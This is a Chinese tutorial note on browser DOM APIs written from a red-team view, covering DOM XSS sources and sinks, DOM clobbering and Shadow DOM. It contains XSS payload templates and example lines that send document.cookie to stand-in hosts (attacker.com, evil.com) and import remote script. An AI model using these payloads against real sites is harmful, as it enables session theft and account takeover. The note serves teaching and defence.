## 目录

- [[#一、什么是DOM|一、什么是DOM]]
- [[#二、DOM查询与遍历|二、DOM查询与遍历]]
- [[#三、DOM修改与创建|三、DOM修改与创建]]
- [[#四、事件系统|四、事件系统]]
- [[#五、DOM XSS详解|五、DOM XSS详解]]
- [[#六、DOM Clobbering攻击|六、DOM Clobbering攻击]]
- [[#七、Shadow DOM与Web Components|七、Shadow DOM与Web Components]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、什么是DOM

DOM (Document Object Model) 是浏览器将HTML/XML文档解析后的树形对象模型。DOM API提供了操作页面的编程接口。

```
文档根节点 (document)
└── html
    ├── head
    │   ├── meta
    │   ├── title
    │   └── link
    └── body
        ├── div#app
        │   ├── h1
        │   └── p
        ├── script
        └── footer
```

### 关键概念

| 概念 | 说明 |
|------|------|
| `document` | 整个文档的入口对象 |
| `Node` | 所有DOM节点的基类 |
| `Element` | HTML元素节点 |
| `Attr` | 属性节点 |
| `Text` | 文本节点 |
| `window` | 全局对象（浏览器窗口） |

## 二、DOM查询与遍历

### 查询方法

```javascript
// 通过ID（最快）
document.getElementById('login-form');

// 通过CSS选择器（推荐）
document.querySelector('#login-form');
document.querySelectorAll('.input-field');

// 通过类名
document.getElementsByClassName('input-field');

// 通过标签名
document.getElementsByTagName('input');

// 通过name属性
document.getElementsByName('csrf_token');
```

### 遍历关系

```javascript
element.parentNode         // 父节点
element.childNodes         // 所有子节点（含文本节点）
element.children           // 子元素（不含文本节点）
element.firstElementChild  // 第一个子元素
element.lastElementChild   // 最后一个子元素
element.previousElementSibling  // 前一个兄弟元素
element.nextElementSibling      // 后一个兄弟元素
```

### XSS中的DOM查询

```javascript
// 查找所有密码输入框
document.querySelectorAll('input[type="password"]');

// 查找所有可提交的表单
document.querySelectorAll('form[action]');

// 查找所有隐藏的CSRF Token
document.querySelectorAll('input[name$="token"]');
document.querySelectorAll('input[name$="csrf"]');

// 快速提取token值
var token = document.querySelector('input[name="csrf_token"]').value;
```

## 三、DOM修改与创建

### 文本操作

```javascript
// 危险 —— 直接设置HTML（XSS入口！）
element.innerHTML = '<img src=x onerror=alert(1)>';
element.outerHTML = '<div>new</div>';

// 危险 —— 插入相邻HTML
element.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>');

// 安全 —— 纯文本（自动转义）
element.textContent = '<script>alert(1)</script>';  // 显示为文本
element.innerText = '<script>alert(1)</script>';    // 同上
```

### 属性操作

```javascript
// 获取/设置属性
element.getAttribute('href');
element.setAttribute('href', 'https://evil.com');
element.removeAttribute('hidden');

// 便捷访问（部分属性）
element.id;          // 等同于 element.getAttribute('id')
element.className;   // class属性
element.href;        // a标签的href
element.src;         // img/script的src
element.value;       // input的value
```

### 创建元素

```javascript
const img = document.createElement('img');
img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
document.body.appendChild(img);
```

### 删除元素

```javascript
element.remove();           // 现代方法
element.parentNode.removeChild(element);  // 传统方法
```

## 四、事件系统

### 事件绑定

```javascript
// HTML属性方式（内联事件）
<button onclick="alert(1)">

// DOM属性方式
element.onclick = function() { alert(1); };

// addEventListener（推荐，可多个监听器）
element.addEventListener('click', function(e) {
  e.preventDefault();  // 阻止默认行为
  e.stopPropagation(); // 阻止冒泡
});
```

### 事件流三阶段

```
捕获阶段 (Capture) → 目标阶段 (Target) → 冒泡阶段 (Bubble)
   ↓                       ↓                    ↓
document → html → body → button → body → html → document
```

### 红队常用事件

| 事件 | 触发 | 无用户交互 |
|------|------|:---:|
| `onerror` | 资源加载失败 | ✓ |
| `onload` | 元素加载完成 | ✓ |
| `onfocus` + `autofocus` | 获得焦点 | ✓ |
| `onanimationend` | CSS动画结束 | ✓ |
| `onscroll` | 滚动 | ✗ |
| `onclick` | 点击 | ✗ |
| `oninput` | 输入 | ✗ |
| `onmouseover` | 悬停 | ✗ |
| `oncopy` | 复制 | ✗ |

### 事件对象

```javascript
element.addEventListener('click', function(e) {
  e.target;           // 触发事件的元素
  e.currentTarget;    // 事件绑定的元素
  e.type;             // 事件类型
  e.clientX/clientY;  // 鼠标坐标
  e.key;              // 按键值（键盘事件）
  
  // XSS中常用
  e.preventDefault();   // 阻止默认（如表单提交）
  e.stopPropagation();  // 阻止冒泡
});
```

## 五、DOM XSS详解

### 类型

**类型1：Source → Sink（源到汇聚点）**

```javascript
// Source：用户可控的数据
var user = location.hash.substring(1);   // URL # 后内容
var user = location.search.substring(1); // URL ? 后内容
var user = document.referrer;            // 来源URL
var user = window.name;                  // 窗口名称
var user = postMessage data;             // 跨域消息

// 危险Sink（= XSS）
element.innerHTML = user;            // HTML上下文
element.outerHTML = user;
document.write(user);
document.writeln(user);
eval(user);
new Function(user);
setTimeout(user);
setInterval(user);
element.setAttribute('onclick', user);  // 属性上下文
```

**类型2：常见Source列表**

```javascript
// URL相关
location / location.href / location.hash / location.search
document.URL / document.documentURI / document.baseURI

// 存储相关
document.cookie
localStorage.getItem('key')
sessionStorage.getItem('key')

// 通信相关
postMessage (event.data)
window.name

// 导航相关
document.referrer
history.pushState / replaceState (state参数)
```

### DOM型XSS payload构造

```javascript
// Source: URL hash
// https://target.com/page#<img src=x onerror=alert(1)>

// 页面JS（存在DOM XSS）
var userAnchor = location.hash.substring(1);
document.getElementById('welcome').innerHTML = userAnchor;
// 结果：<img>注入到页面中，触发alert
```

### 防御DOM XSS

```javascript
// 正确做法
element.textContent = userInput;     // 纯文本（安全）
element.setAttribute(key, value);    // 自动转义属性值

// JavaScript字符串上下文中需手动转义
var clean = userInput.replace(/"/g, '\\"').replace(/'/g, "\\'");
```

## 六、DOM Clobbering攻击

### 原理

HTML中的 `id` 和 `name` 属性会在 `window` 对象上创建同名全局变量。攻击者可以在页面上创建元素，覆盖已有的全局变量或对象属性。

```html
<!-- 攻击者注入 -->
<form id="config">
  <input name="isAdmin" value="true">
</form>

<!-- 原有代码 -->
<script>
  // config 被覆盖为 DOM 元素，不再是原有的配置对象
  if (config.isAdmin) {   // config.isAdmin 是 <input> 元素
    // config.isAdmin 的 truthy 值绕过了权限检查
  }
</script>
```

### 双层嵌套Clobbering

```html
<!-- 构造嵌套对象 -->
<form id="app">
  <input name="user" value="admin">
  <img name="role" src="x">  <!-- role 被设置为 img 元素 -->
</form>

<script>
  // app.user => <input> 元素
  // app.user.value => "admin"
  // 绕过了 `if (app.user === 'admin')` 的检查
</script>
```

### HTMLCollection的陷阱

```html
<form id="actions">
  <a id="submit" href="javascript:evil()">Submit</a>
</form>

<script>
  // document.getElementById('submit') 原来的代码
  // 被 form 内的 <a> 覆盖
  // 调用 submit() 可能导航到 javascript:evil()
</script>
```

### 检测与利用

```javascript
// 测试页面是否存在DOM Clobbering
console.log(window.config);  // 看是否返回DOM元素而非预期对象
console.log(typeof window.config);  // 如果是 'object' 而非预期类型
```

## 七、Shadow DOM与Web Components

### Shadow DOM

Shadow DOM 将DOM子树封装在独立的作用域中，样式和JS与外部隔离。

```javascript
const host = document.getElementById('host');
const shadow = host.attachShadow({ mode: 'open' });  // 'open' 可被JS访问
shadow.innerHTML = `<style>p{color:red}</style><p>Shadow DOM content</p>`;
```

红队关注：
- `mode: 'closed'` 不能通过 `element.shadowRoot` 访问（但仍可通过原型链污染绕过）
- Shadow DOM内的CSS选择器不会泄露到外部
- XSS payload如果注入在Shadow DOM内部，作用范围受限
- 但如果注入在Shadow DOM外，内部的选择器不会泄露隐私

### 自定义元素 (Custom Elements)

```javascript
class MyElement extends HTMLElement {
  constructor() {
    super();
    this.innerHTML = `<p>Custom element content</p>`;
  }
}
customElements.define('my-element', MyElement);
```

## 八、红队视角总结

### DOM XSS攻击检查清单

- [ ] 页面JS是否使用 `innerHTML` 处理URL参数？
- [ ] 是否使用 `document.write()` 动态写页面内容？
- [ ] jQuery的 `.html()` 是否有用户输入？
- [ ] 是否使用 `eval()` 处理URL hash？
- [ ] `postMessage` 处理器是否验证了 `event.origin`？
- [ ] 是否存在DOM Clobbering风险（全局变量与HTML id冲突）？

### 常用DOM XSS payload模板

```javascript
// 基础
"<img src=x onerror=alert(1)>"
"<svg/onload=alert(1)>"
"<body onload=alert(1)>"

// 利用现有变量
"<img src=x onerror=alert(document.cookie)>"
"<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"

// 绕过长度限制
`<img src=x onerror="import('//evil.com/exploit.js')">`  // 现代动态import

// DOM Clobbering payload
<form id=___config__><input name=isAdmin value=true>
```

---
**返回** [[JS基础总目录|JavaScript 总目录]] | [[../前端基础总目录|前端基础总目录]]
